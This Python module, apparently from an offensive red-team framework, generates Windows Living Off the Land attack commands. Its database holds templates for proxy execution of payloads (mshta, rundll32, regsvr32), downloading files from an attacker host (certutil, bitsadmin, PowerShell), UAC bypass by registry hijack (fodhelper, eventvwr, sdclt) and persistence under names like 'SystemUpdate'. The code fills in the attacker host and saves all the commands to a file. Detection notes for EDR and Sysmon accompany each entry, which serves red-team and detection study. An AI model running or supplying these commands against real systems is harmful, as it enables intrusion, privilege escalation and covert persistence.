"""Living Off the Land Binaries and Scripts module.

Maps to MITRE T1218 — System Binary Proxy Execution.
"""

from __future__ import annotations

from datetime import datetime

from rich.table import Table
from rich import box

from ghost.logger import console, info, ok, warn, section
from ghost.models import AttackResult, EngagementContext
from ghost.utils.artifacts import save_artifact
from ghost.modules.base import BaseModule


class LOLBaSModule(BaseModule):
    """Living Off the Land Binaries and Scripts.
    Maps to MITRE T1218 — System Binary Proxy Execution.
    """

    name = "LOLBaS Command Generator"

    DATABASE = {
        "execution": [
            {
                "binary": "mshta.exe",
                "mitre": "T1218.005",
                "command": 'mshta.exe "javascript:a=new ActiveXObject(\'Wscript.Shell\');a.Run(\'<PAYLOAD>\');close()"',
                "sysmon_events": ["1 (Process Create)", "7 (Image Loaded)"],
                "edr_notes": "High visibility — mshta spawning child processes is a top-tier alert"
            },
            {
                "binary": "rundll32.exe",
                "mitre": "T1218.011",
                "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"Wscript.Shell\");h.Run(\"<PAYLOAD>\");",
                "sysmon_events": ["1 (Process Create)", "7 (Image Loaded)", "11 (File Create)"],
                "edr_notes": "Commonly monitored — rundll32 executing scripts is well-signatured"
            },
            {
                "binary": "regsvr32.exe",
                "mitre": "T1218.010",
                "command": "regsvr32.exe /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)"],
                "edr_notes": "Squiblydoo attack — network connection from regsvr32 is flagged"
            },
            {
                "binary": "certutil.exe",
                "mitre": "T1218",
                "command": "certutil.exe -urlcache -split -f http://<LHOST>/payload.exe %TEMP%\\payload.exe",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)", "11 (File Create)"],
                "edr_notes": "Heavily monitored — certutil downloading files is a primary detection rule"
            },
            {
                "binary": "msiexec.exe",
                "mitre": "T1218.007",
                "command": "msiexec.exe /q /i http://<LHOST>/payload.msi",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)"],
                "edr_notes": "Medium detection — MSI install from network URL raises alerts"
            },
            {
                "binary": "wmic.exe",
                "mitre": "T1218",
                "command": "wmic.exe process call create \"<PAYLOAD>\"",
                "sysmon_events": ["1 (Process Create)", "20 (WmiEvent)"],
                "edr_notes": "WMIC process creation is heavily logged and monitored"
            },
            {
                "binary": "cmstp.exe",
                "mitre": "T1218.003",
                "command": "cmstp.exe /ni /s <malicious.inf>",
                "sysmon_events": ["1 (Process Create)", "12 (Registry Event)"],
                "edr_notes": "Less commonly monitored — effective for UAC bypass"
            },
            {
                "binary": "forfiles.exe",
                "mitre": "T1218",
                "command": 'forfiles.exe /p C:\\Windows\\System32 /m notepad.exe /c "<PAYLOAD>"',
                "sysmon_events": ["1 (Process Create)"],
                "edr_notes": "Low visibility — forfiles is rarely monitored directly"
            },
            {
                "binary": "pcalua.exe",
                "mitre": "T1218",
                "command": "pcalua.exe -a <PAYLOAD>",
                "sysmon_events": ["1 (Process Create)"],
                "edr_notes": "Low visibility — Program Compatibility Assistant rarely monitored"
            },
        ],
        "download": [
            {
                "binary": "certutil.exe",
                "mitre": "T1105",
                "command": "certutil.exe -urlcache -split -f http://<LHOST>/<FILE> %TEMP%\\<FILE>",
                "sysmon_events": ["3 (Network Connection)", "11 (File Create)"],
                "edr_notes": "Primary download detection vector — always flagged"
            },
            {
                "binary": "bitsadmin.exe",
                "mitre": "T1105",
                "command": "bitsadmin.exe /transfer job /download /priority high http://<LHOST>/<FILE> %TEMP%\\<FILE>",
                "sysmon_events": ["3 (Network Connection)", "11 (File Create)"],
                "edr_notes": "BITS jobs are logged and monitored by most EDRs"
            },
            {
                "binary": "PowerShell (IWR)",
                "mitre": "T1105",
                "command": "powershell.exe -c \"Invoke-WebRequest -Uri http://<LHOST>/<FILE> -OutFile %TEMP%\\<FILE>\"",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)"],
                "edr_notes": "PowerShell network activity always logged via ScriptBlock/Module logging"
            },
            {
                "binary": "Start-BitsTransfer",
                "mitre": "T1105",
                "command": "powershell.exe -c \"Start-BitsTransfer -Source http://<LHOST>/<FILE> -Destination %TEMP%\\<FILE>\"",
                "sysmon_events": ["1 (Process Create)", "3 (Network Connection)"],
                "edr_notes": "BITS transfer via PowerShell — double logging (PS + BITS)"
            },
        ],
        "compile_execute": [
            {
                "binary": "csc.exe",
                "mitre": "T1127.001",
                "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:%TEMP%\\payload.exe <source.cs>",
                "sysmon_events": ["1 (Process Create)", "11 (File Create)"],
                "edr_notes": "CSC compiling code at runtime is suspicious — logged but less commonly alerted"
            },
            {
                "binary": "MSBuild.exe",
                "mitre": "T1127.001",
                "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe <malicious.csproj>",
                "sysmon_events": ["1 (Process Create)", "7 (Image Loaded)"],
                "edr_notes": "MSBuild inline tasks can execute arbitrary code — high detection in mature environments"
            },
            {
                "binary": "InstallUtil.exe",
                "mitre": "T1218.004",
                "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U <payload.dll>",
                "sysmon_events": ["1 (Process Create)", "7 (Image Loaded)"],
                "edr_notes": "InstallUtil /U (uninstall) executes Uninstall() method — well-known bypass"
            },
        ],
        "uac_bypass": [
            {
                "binary": "fodhelper.exe",
                "mitre": "T1548.002",
                "command": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"<PAYLOAD>\" /f && fodhelper.exe",
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Classic UAC bypass — registry write + auto-elevate binary"
            },
            {
                "binary": "eventvwr.exe",
                "mitre": "T1548.002",
                "command": "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"<PAYLOAD>\" /f && eventvwr.exe",
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Registry hijack — eventvwr.exe reads HKCU before HKCR"
            },
            {
                "binary": "computerdefaults.exe",
                "mitre": "T1548.002",
                "command": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"<PAYLOAD>\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f && computerdefaults.exe",
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Similar to fodhelper — uses ms-settings handler hijack"
            },
            {
                "binary": "sdclt.exe",
                "mitre": "T1548.002",
                "command": "reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /d \"<PAYLOAD>\" /f && reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /v DelegateExecute /f && sdclt.exe",
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Backup utility UAC bypass — effective on Windows 10"
            },
        ],
        "persistence": [
            {
                "binary": "schtasks.exe",
                "mitre": "T1053.005",
                "command": 'schtasks.exe /create /tn "SystemUpdate" /tr "<PAYLOAD>" /sc onlogon /rl highest',
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Scheduled task creation is a primary persistence detection vector"
            },
            {
                "binary": "reg.exe (Run key)",
                "mitre": "T1547.001",
                "command": 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Updater" /d "<PAYLOAD>" /f',
                "sysmon_events": ["12/13 (Registry Event)"],
                "edr_notes": "Run key modification — most basic persistence, always monitored"
            },
            {
                "binary": "sc.exe",
                "mitre": "T1543.003",
                "command": 'sc create GhostSvc binPath= "<PAYLOAD>" start= auto',
                "sysmon_events": ["1 (Process Create)", "12/13 (Registry Event)"],
                "edr_notes": "Service creation requires admin — logged in Security event log"
            },
            {
                "binary": "wmic.exe (startup)",
                "mitre": "T1547.001",
                "command": 'wmic startup call create "name=Updater, command=<PAYLOAD>"',
                "sysmon_events": ["1 (Process Create)", "20 (WmiEvent)"],
                "edr_notes": "WMI startup entry — less commonly monitored than registry Run keys"
            },
        ],
    }

    def run(self, ctx: EngagementContext) -> None:
        section("Module 4 — LOLBaS Command Generator [T1218]")

        if ctx.target_os != "windows":
            warn("LOLBaS database is Windows-specific — skipping on non-Windows target")
            ctx.results.append(AttackResult(
                module="lolbas", action="skip", status="ok",
                severity="info", notes="LOLBaS not applicable on non-Windows target"
            ))
            return

        total_commands = 0
        all_commands = []

        for category, entries in self.DATABASE.items():
            cat_title = category.replace("_", " ").title()
            info(f"Loading {cat_title} binaries ({len(entries)} entries)...")

            table = Table(title=f"LOLBaS — {cat_title}", box=box.ROUNDED)
            table.add_column("Binary", style="cyan", width=20)
            table.add_column("MITRE", style="dim", width=12)
            table.add_column("Sysmon Events", width=28)
            table.add_column("EDR Risk")

            for entry in entries:
                cmd = entry["command"]
                cmd = cmd.replace("<LHOST>", ctx.lhost).replace("<PAYLOAD>", "cmd.exe /c calc.exe")
                sysmon = ", ".join(entry["sysmon_events"])
                table.add_row(
                    entry["binary"],
                    entry["mitre"],
                    sysmon,
                    entry["edr_notes"][:50] + "..."
                )
                all_commands.append(f"# {entry['binary']} [{entry['mitre']}]\n# {entry['edr_notes']}\n{cmd}\n")
                total_commands += 1

            console.print(table)

        # -- Save all commands --
        artifact = f"# Ghost LOLBaS Commands — Generated {datetime.now().isoformat()}\n"
        artifact += f"# Target: {ctx.target_os} | LHOST: {ctx.lhost}\n"
        artifact += "# Replace <PAYLOAD>, <FILE>, <LHOST> placeholders as needed\n\n"
        artifact += "\n".join(all_commands)

        path = save_artifact(ctx, "lolbas_commands.txt", artifact)
        ok(f"All {total_commands} LOLBaS commands saved to {path}")

        ctx.results.append(AttackResult(
            module="lolbas", action="generate_commands", status="ok",
            severity="high",
            notes=f"Generated {total_commands} LOLBaS commands across {len(self.DATABASE)} categories"
        ))
